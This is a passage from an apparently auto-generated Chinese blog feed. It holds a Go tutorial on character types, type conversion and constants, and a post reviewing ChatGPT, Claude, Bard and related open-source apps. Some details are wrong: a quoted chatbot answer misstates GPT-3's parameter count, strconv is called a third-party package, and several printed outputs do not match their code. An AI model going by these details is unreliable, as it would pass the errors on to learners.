href="#六、参考来源" class="headerlink" title="六、参考来源"></a>六、参考来源</h2><ol><li><a href="https://chat.openai.com/">https://chat.openai.com/</a></li><li><a href="https://app.slack.com/">https://app.slack.com</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>chatgpt LLM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go语言基础学习(一)</title>
    <link href="/2023/04/21/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%B8%80)/"/>
    <url>/2023/04/21/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<h2 id="一-、Go-语言的字符类型"><a href="#一-、Go-语言的字符类型" class="headerlink" title="一 、Go 语言的字符类型"></a>一 、Go 语言的字符类型</h2><p>字符类型在工作中也会非常频繁地用到，是一个非常重要的数据类型。这里主要介绍 Go 语言中处理<strong>字符和字符串</strong>的数据类型</p><h3 id="1-1-字符和字符串类型"><a href="#1-1-字符和字符串类型" class="headerlink" title="1.1 字符和字符串类型"></a>1.1 字符和字符串类型</h3><table><thead><tr><th align="left">序号</th><th align="left">类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">byte</td><td align="left"><strong>uint8</strong> 类型的别名，同等于 <strong>uint8</strong>。一般用于表示 <strong>ASCII</strong> 字符，即只能操作简单的字符，<strong>不支持中文操作</strong>。</td></tr><tr><td align="left">2</td><td align="left">rune</td><td align="left"><strong>int32</strong> 类型的别名，同等于 <strong>int32</strong>。一般用于表示 <strong>Unicode</strong> 字符，即可以处理<strong>任何字符</strong>。</td></tr><tr><td align="left">3</td><td align="left">string</td><td align="left">一个指向 byte 数组的指针，可以为<strong>空字符串</strong>不可为<strong>nil</strong>。</td></tr></tbody></table><h3 id="1-2-代码示例"><a href="#1-2-代码示例" class="headerlink" title="1.2 代码示例"></a>1.2 代码示例</h3><p>使用一段代码来更清晰地解释<code>byte</code>和<code>rune</code>的区别，以及了解这三个类型的关系。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-comment">// 将字符串转化为rune的数组，并替换数组第i个元素为ch</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">str2Rune</span><span class="hljs-params">(str *<span class="hljs-type">string</span>, i <span class="hljs-type">int</span>, ch <span class="hljs-type">rune</span>)</span></span> &#123;<br>temp := []<span class="hljs-type">rune</span>(*str)<br>temp[i] = ch<br>*str = <span class="hljs-type">string</span>(temp)<br>&#125;<br><br><span class="hljs-comment">// 将字符串转换为byte的数组，并替换数组第i个元素为ch</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">str2Byte</span><span class="hljs-params">(str *<span class="hljs-type">string</span>, i <span class="hljs-type">int</span>, ch <span class="hljs-type">byte</span>)</span></span> &#123;<br>temp := []<span class="hljs-type">byte</span>(*str)<br>temp[i] = ch<br>*str = <span class="hljs-type">string</span>(temp)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>str := <span class="hljs-string">&quot;你好 Hello&quot;</span><br>str1 := <span class="hljs-string">&quot;你好 Hello&quot;</span><br>str2 := <span class="hljs-string">&quot;你好 Hello&quot;</span><br>str2Rune(&amp;str, <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;A&#x27;</span>)  <span class="hljs-comment">//将第1个字符替换为A</span><br>str2Byte(&amp;str1, <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-comment">//将第3个字符替换为A</span><br>str2Byte(&amp;str2, <span class="hljs-number">7</span>, <span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-comment">// 将第7个字符替换为A</span><br>fmt.Println(<span class="hljs-string">&quot;rune 数组处理中文后: &quot;</span>, str)<br>fmt.Println(<span class="hljs-string">&quot;byte 数组处理中文后: &quot;</span>, str1)<br>fmt.Println(<span class="hljs-string">&quot;byte 数组处理中文后: &quot;</span>, str2)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果如下：</p><p><img src="/../img/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0(%E4%B8%80)/image-20230421171217768.png" alt="byte 和 rune 区别实例输出结果"></p><hr><p><strong>结论</strong></p><ul><li><code>string</code>可以直接转换为<code>rune</code>或者<code>byte</code>的<strong>数组；</strong></li><li><code>rune</code>和<code>byte</code>可以互相转换；</li><li><code>byte</code> 的操作单位是一个<strong>字节</strong>，可以理解为一个英文字符；</li><li><code>rune</code> 的操作单位是一个<strong>字符</strong>，不管这个字符是什么字符。</li></ul><h2 id="二、-Go-语言的强制类型转换"><a href="#二、-Go-语言的强制类型转换" class="headerlink" title="二、 Go 语言的强制类型转换"></a>二、 Go 语言的强制类型转换</h2><p>Go 语言是一种强类型语言，而且没有<strong>隐式转换</strong>。也就是说运算符左右的<strong>变量类型必须一致</strong>，若不一致就会报错。为了使用户更加的容易使用，所以 Go 语言提供了各个类型之间强制类型转换的内置方法。</p><h3 id="2-1-整型和浮点型互相转换"><a href="#2-1-整型和浮点型互相转换" class="headerlink" title="2.1 整型和浮点型互相转换"></a>2.1 整型和浮点型互相转换</h3><p><strong>整型</strong>和<strong>浮点型</strong>变量之间的相互转换相对容易，只需使用强制类型转换标志 <code>type(variable)</code>就好了。需要注意的是，当<strong>高精度</strong>向<strong>低精度</strong>类型转换的时候，会<strong>失真</strong>。即浮点型向整型转换的时候会失去其小数部分。需要<strong>避免这两个类型的互相转换</strong>。</p><p>但是也有无法避免的场景，比如说计算浮点数和整数的和之类的情况中。就要秉持<strong>不失真原则</strong>，将低精度向高精度转换之后进行计算。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a <span class="hljs-type">int</span> = <span class="hljs-number">10</span>       <span class="hljs-comment">// 声明一个整型变量a 并给 a 赋值为10</span><br><span class="hljs-keyword">var</span> b <span class="hljs-type">float32</span> = <span class="hljs-number">3.14</span> <span class="hljs-comment">// 声明一个浮点型变量b 并给 b 赋值为3.14</span><br><br>fmt.Println(<span class="hljs-string">&quot;整型转换为浮点型: %f\n&quot;</span>, <span class="hljs-type">float32</span>(a)) <span class="hljs-comment">// 将变量 a 强制转换为浮点型变量并打印</span><br>fmt.Println(<span class="hljs-string">&quot;浮点型转换为整型: %d\n&quot;</span>, <span class="hljs-type">int</span>(b))     <span class="hljs-comment">// 浮点型转为整型会失真</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>最终输出结果为</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cos">整型转换为浮点型: <span class="hljs-built_in">%f</span><br> <span class="hljs-number">10</span><br>浮点型转换为整型: <span class="hljs-built_in">%d</span><br> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>可以发现浮点型转为整型时候，3.14 失真了，结果为 3。</p><h3 id="2-2-整形和字符串互相转换"><a href="#2-2-整形和字符串互相转换" class="headerlink" title="2.2 整形和字符串互相转换"></a>2.2 整形和字符串互相转换</h3><p>整型和字符串类型的变量互相转换，需要依靠 Go 语言提供的转换包<code>strconv</code>。字符串转整型需要使用这个包的<code>Atoi(string)</code>方法，整型转字符串则是<code>Itoa(int)</code>。这种转换用得最多的就是给一些对象进行<strong>编号</strong>。比如需要给张三编号为NO.1，你可能需要将1转换为字符串之后与NO.进行拼接。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;strconv&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a <span class="hljs-type">int</span> = <span class="hljs-number">10</span>      <span class="hljs-comment">// 定义一个整型变量并赋值为 10</span><br><span class="hljs-keyword">var</span> b <span class="hljs-type">string</span> = <span class="hljs-string">&quot;10&quot;</span> <span class="hljs-comment">// 定义一个字符串类型变量赋值为 &quot;10&quot;</span><br><br>fmt.Printf(<span class="hljs-string">&quot;整型转换为字符串：%s\n&quot;</span>, strconv.Itoa(a))<br>tmp, _ := strconv.Atoi(b)<br>fmt.Printf(<span class="hljs-string">&quot;字符串转换为整型: %d\n&quot;</span>, tmp)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile">整型转换为字符串：10<br><span class="hljs-section">字符串转换为整型: 10</span><br></code></pre></td></tr></table></figure><h3 id="2-3-浮点型和字符串互相转换"><a href="#2-3-浮点型和字符串互相转换" class="headerlink" title="2.3 浮点型和字符串互相转换"></a>2.3 浮点型和字符串互相转换</h3><p>浮点型和字符串的互相转换没有直接封装好的转换接口了，需要调用<code>strconvs</code>包中稍微底层一点的接口。浮点型转字符串使用<code>FormatFloat(float64,byte,int,int)</code>方法，字符串转换为浮点型则使用<code>ParseFloat(...)</code>方法。因为浮点数在存储过程中容易因为<strong>精度问题而存在误差</strong>，所以有时候会将<strong>浮点数转换为字符串</strong>进行存储。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;strconv&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>f1 := <span class="hljs-number">0.123456789</span><br>s1 := strconv.FormatFloat(f1, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">32</span>)<br>s2 := strconv.FormatFloat(f1, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">64</span>)<br>s3 := <span class="hljs-string">&quot;0.123456789&quot;</span><br>f2, _ := strconv.ParseFloat(s3, <span class="hljs-number">64</span>)<br>f3, _ := strconv.ParseFloat(s3, <span class="hljs-number">32</span>)<br>fmt.Println(<span class="hljs-string">&quot;将浮点数转换为float32转换为string: &quot;</span>, s2)<br>fmt.Println(<span class="hljs-string">&quot;将float64转换为string: &quot;</span>, s1)<br>fmt.Println(<span class="hljs-string">&quot;将string转换为float64: &quot;</span>, f2)<br>fmt.Println(<span class="hljs-string">&quot;将string转换为float32再强制转换为float54: &quot;</span>, f3)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">将浮点数转换为<span class="hljs-built_in">float</span>32转换为<span class="hljs-built_in">string</span>:  <span class="hljs-number">0.123456789</span><br>将<span class="hljs-built_in">float</span>64转换为<span class="hljs-built_in">string</span>:  <span class="hljs-number">0.12345679</span><br>将<span class="hljs-built_in">string</span>转换为<span class="hljs-built_in">float</span>64:  <span class="hljs-number">0.123456789</span><br>将<span class="hljs-built_in">string</span>转换为<span class="hljs-built_in">float</span>32再强制转换为<span class="hljs-built_in">float</span>54:  <span class="hljs-number">0.12345679104328156</span><br></code></pre></td></tr></table></figure><p>Go 语言中各个数据类型的互相强制转换。主要都是依赖与 <code>strconvs</code> 这个第三方包。这个包中还提供了其它很多的转换方法，在做类型转换的时候要注意：<strong>浮点型在转为整型时会失真。</strong></p><h2 id="三、-Go语言的常量"><a href="#三、-Go语言的常量" class="headerlink" title="三、 Go语言的常量"></a>三、 Go语言的常量</h2><p>常量可以理解为是一个存储了不可以改变的值的变量。常量主要用于<strong>特殊值的语义化</strong>，使这些值在更容易维护的情况下不会被程序所修改。Go 语言中声明常量使用的关键字是<code>const</code>。常量的使用非常广泛，比如说圆周率，再比如说一些明确的错误信息等一些容易被<strong>多次使用的值</strong>，一般都会使用常量进行实例化，使其在需要更改时，更容易维护，同时增加代码可读性。</p><h3 id="3-1-常量定义"><a href="#3-1-常量定义" class="headerlink" title="3.1 常量定义"></a>3.1 常量定义</h3><p>常量定义的形式为 <code>const 常量名 常量类型 = 常量值</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-keyword">const</span> c1 <span class="hljs-type">string</span> = <span class="hljs-string">&quot;2023年4月23日&quot;</span><br><span class="hljs-keyword">const</span> c2 = <span class="hljs-string">&quot;2023年4月23日&quot;</span> <span class="hljs-comment">// 和变量一样，常量也可以部使用数据类型直接赋值，其类型和值一致</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(c1)<br>fmt.Println(c2)<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="3-2-多常量定义"><a href="#3-2-多常量定义" class="headerlink" title="3.2 多常量定义"></a>3.2 多常量定义</h3><h4 id="3-2-1-普通模式"><a href="#3-2-1-普通模式" class="headerlink" title="3.2.1 普通模式"></a>3.2.1 普通模式</h4><p>和 Go 语言的变量一样，常量也可以进行<strong>多常量定义</strong>。定义形式为<code>const 常量名,常量名= 常量值,常量值</code>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br><br><span class="hljs-keyword">import</span> (  <br> <span class="hljs-string">&quot;fmt&quot;</span>  <br>)  <br><br><span class="hljs-keyword">const</span> c1, c2 = <span class="hljs-string">&quot;2020年3月8日&quot;</span>, <span class="hljs-string">&quot;2020年3月9日&quot;</span>  <br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br> fmt.Println(c1)  <br> fmt.Println(c2)  <br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2023</span>年<span class="hljs-number">4</span>月<span class="hljs-number">23</span>日<br><span class="hljs-attribute">2023</span>年<span class="hljs-number">4</span>月<span class="hljs-number">23</span>日<br></code></pre></td></tr></table></figure><h4 id="3-2-2-特殊方式"><a href="#3-2-2-特殊方式" class="headerlink" title="3.2.2 特殊方式"></a>3.2.2 特殊方式</h4><p>在常量的使用中，Go 语言还提供了一种特殊的多常量定义方式——<code>const()</code>。这种定义方式也是比较推荐的常量使用方式。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-keyword">const</span> (<br>c1 = <span class="hljs-string">&quot;2020年3月8日&quot;</span><br>c2 = <span class="hljs-string">&quot;2020年3月9日&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(c1)<br>fmt.Println(c2)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2020</span>年<span class="hljs-number">3</span>月<span class="hljs-number">8</span>日<br><span class="hljs-attribute">2020</span>年<span class="hljs-number">3</span>月<span class="hljs-number">9</span>日<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>chatgpt及其大语言模型(LLM)应用</title>
    <link href="/2023/04/20/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/"/>
    <url>/2023/04/20/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>为了顺应时代浪潮（<del>怕被卷没了</del>），开始使用chatgpt这种大语言模型（LLM）应用了，体验了Chatgpt、谷歌Bard、Claude等国外的LLM应用，主要国内也没获取到相关应用到内测资格 hhh</p><p>其中Chatgpt 和 Claude 算是目前本人的主力使用，对中文也很友好，而且能解决代码开发中的效率问题，妥妥生产力！</p><h2 id="2-大语言模型（LLM）"><a href="#2-大语言模型（LLM）" class="headerlink" title="2. 大语言模型（LLM）"></a>2. 大语言模型（LLM）</h2><p>什么是大语言模型？</p><blockquote><p>大语言模型（LLM）是指能够学习和预测人类自然语言的模型，它使用大规模的文本数据来模拟语言的结构和语法规则。LLM通常使用深度学习算法（如循环神经网络，长短时记忆网络等）来提高预测的准确性，并在自然语言处理任务中取得了很好的效果，如自动问答、机器翻译、文本摘要、语音识别等。大型语言模型在机器学习领域拥有广泛的应用，对人工智能发展有很大的推动作用。</p></blockquote><p>———以上来自 Chatgpt 3.5</p><blockquote><p>大语言模型(Large Language Model,简称LLM)是一类使用神经网络训练的大规模语言模型。它们通常包含数十亿个参数,可以学习无监督的大量文本数据,并生成自然语言。目前较知名的LLM有:</p><ol><li>GPT-3:开放AI旗下的模型,包含175亿个参数,可以生成文本、翻译语言、回答问题等。</li><li>BERT:Google开发的语言表示模型,用于自然语言处理任务,包含110M个参数。</li><li>XLNet:谷歌开发的语言模型,包含110M个参数,在多个自然语言处理任务上超过BERT。</li><li>T5:谷歌开发的文本到文本模型,可以用于生成文本和回答问题,包含11B个参数。</li><li>CTRL:Salesforce开发的语言模型,包含13B个参数,可以生成长篇小说和婚礼誓词等长篇文本。</li></ol><p>LLM的主要特征有:</p><ol><li><p>规模巨大:通常包含几十亿个参数,可以学习海量的数据集。</p></li><li><p>无监督学习:不需要人工标注的数据,可以学习一整个维基百科的数据集。</p></li><li><p>多功能:一个模型可以适用于多种自然语言处理任务,如生成文本、翻译、问答、文本摘要等。</p></li><li><p>超过人类表现:在某些任务上已经超过平均人类表现,如阅读理解。</p><p>目前, LLM仍面临生成的文本安全性、健壮性不足的问题。但未来,随着计算资源的增加和模型的进一步提高,LLM有望在更多语言技术场景中发挥重要作用。总之,大语言模型利用深度神经网络和大数据推动了自然语言处理技术的进步,值得我们持续关注。</p></li></ol></blockquote><p>———以上来自Claude</p><h2 id="3-LLM的应用"><a href="#3-LLM的应用" class="headerlink" title="3. LLM的应用"></a>3. LLM的应用</h2><h3 id="3-1-Chatgpt-（🌟🌟🌟🌟🌟）"><a href="#3-1-Chatgpt-（🌟🌟🌟🌟🌟）" class="headerlink" title="3.1 Chatgpt （🌟🌟🌟🌟🌟）"></a>3.1 Chatgpt （🌟🌟🌟🌟🌟）</h3><p>官网：</p><p><a href="https://chat.openai.com/">https://chat.openai.com</a></p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/chatgpt.png" alt="chatgpt"></p><p>至于怎么注册，网上很多了，这里就不赘述</p><h3 id="3-2-Claude-（🌟🌟🌟🌟）"><a href="#3-2-Claude-（🌟🌟🌟🌟）" class="headerlink" title="3.2 Claude （🌟🌟🌟🌟）"></a>3.2 Claude （🌟🌟🌟🌟）</h3><p>“<a href="http://mp.weixin.qq.com/s?__biz=MzIzNjc1NzUzMw==&mid=2247663551&idx=1&sn=0b4d22152423c3977c0e81c19d7a2f32&chksm=e8dec8cddfa941db19bb816db380491ae809762479b77f6f4bb037ffb6396900fc26413c1ace&scene=21#wechat_redirect">ChatGPT最强竞品</a>”，Claude，并且在国内不需要爬墙，<strong>开箱即用</strong>。非常便捷。</p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/640.png" alt="Claude"></p><p>官网：<a href="https://www.anthropic.com/claude-in-slack">https://www.anthropic.com/claude-in-slack</a></p><p> 具体测评可看<a href="https://mp.weixin.qq.com/s/QB85YPjh6DMBTPla4NDfXg">量子位</a>的文章，本文也不多赘述</p><p>放一张使用截图</p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230420235742231.png" alt="Claude"></p><p>并且，因为Claude是嵌入在slack里面的一个应用，slack的APP端也能在国内使用，同样做到了开箱即用，即便你没有机场也能正常使用，这也是我非常推荐Claude的原因。下面贴个app端的截图</p><p>如果你在web端就是用了Claude就能在<strong>最近的应用</strong>找到它</p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422151219622.png" alt="app端的Claude"></p><p>打开就能进行对话，开箱即用。</p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422151452112.png" alt="Claude对话"></p><h3 id="3-3-Bard-（🌟🌟）"><a href="#3-3-Bard-（🌟🌟）" class="headerlink" title="3.3 Bard （🌟🌟）"></a>3.3 Bard （🌟🌟）</h3><p>官网：<a href="https://bard.google.com/">https://bard.google.com</a></p><p>对中文不优化，不咋推荐。</p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230421000024812.png" alt="Bard"></p><h2 id="4-依靠chatgpt开发的应用"><a href="#4-依靠chatgpt开发的应用" class="headerlink" title="4. 依靠chatgpt开发的应用"></a>4. 依靠chatgpt开发的应用</h2><h3 id="4-1-chatgpt-vercel"><a href="#4-1-chatgpt-vercel" class="headerlink" title="4.1 chatgpt-vercel"></a>4.1 <strong>chatgpt-vercel</strong></h3><p>开源的项目，基于 <a href="https://github.com/ddiu8081/chatgpt-demo">chatgpt-demo</a> 开发，可以用<a href="https://vercel.com/">vercel</a>一键搭建一个，绑定域名灵活使用。</p><p>目前本人也搭建了一个，随手用。不定时更新内置key，</p><p>链接：<a href="https://www.mochazz.cloud/">https://www.mochazz.cloud/</a></p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230421001329154.png" alt="chatgpt-vercel"></p><h3 id="4-2-ChuanhuChatGPT"><a href="#4-2-ChuanhuChatGPT" class="headerlink" title="4.2 ChuanhuChatGPT"></a>4.2 ChuanhuChatGPT</h3><p>另外一个比较优质的开源项目</p><p>为ChatGPT&#x2F;ChatGLM&#x2F;LLaMA等多种LLM提供了一个轻快好用的Web图形界面，也支持一件部署到huggingface上面。</p><p>github地址： <a href="https://github.com/GaiZhenbiao/ChuanhuChatGPT">https://github.com/GaiZhenbiao/ChuanhuChatGPT</a></p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230421001747239.png" alt="ChuanhuChatGPT"></p><h3 id="4-3-Feishu-OpenAI"><a href="#4-3-Feishu-OpenAI" class="headerlink" title="4.3 Feishu-OpenAI"></a>4.3 Feishu-OpenAI</h3><p>项目地址：<a href="https://github.com/ConnectAI-E/Feishu-OpenAI">https://github.com/ConnectAI-E/Feishu-OpenAI</a></p><p>作者为 Connect-AI-E， 机器人功能又多又nice！让工作效率起飞！除了飞书以外的，还有钉钉的chatgpt机器人。具体可看项目。</p><p>项目特点：</p><ul><li>🍏 对话基于 OpenAI-<a href="https://platform.openai.com/account/api-keys">gpt-3.5-turbo</a> 接口</li><li>🍎 通过 lark，将 ChatGPT 接入<a href="https://open.feishu.cn/app">飞书</a>和<a href="https://www.larksuite.com/">飞书国际版</a></li><li>🥒 支持<a href="https://github.com/serverless-devs/serverless-devs">Serverless 云函数</a>、<a href="https://dashboard.cpolar.com/login">本地环境</a>、<a href="https://www.docker.com/">Docker</a>、<a href="https://github.com/Leizhenpeng/feishu-chatgpt/releases/">二进制安装包</a> 等多种渠道部署</li><li>🍋 基于<a href="https://github.com/patrickmn/go-cache">goCache</a>内存键值对缓存</li></ul><p>项目部署的方式也很多</p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230421002244049.png" alt="项目部署"></p><h2 id="5-Chatgpt相关插件"><a href="#5-Chatgpt相关插件" class="headerlink" title="5.Chatgpt相关插件"></a>5.Chatgpt相关插件</h2><h3 id="5-1-KeepChatGPT"><a href="#5-1-KeepChatGPT" class="headerlink" title="5.1 KeepChatGPT"></a><strong>5.1 KeepChatGPT</strong></h3><p>一个插件，让你的 ChatGPT 不再报错</p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422143858630.png" alt="KeepChatGPT简介"></p><h4 id="5-1-1-安装步骤"><a href="#5-1-1-安装步骤" class="headerlink" title="5.1.1 安装步骤"></a>5.1.1 安装步骤</h4><ul><li>首先需要安装<strong>Tampermonkey</strong></li></ul><ol><li><p>打开油猴脚本官网：<a 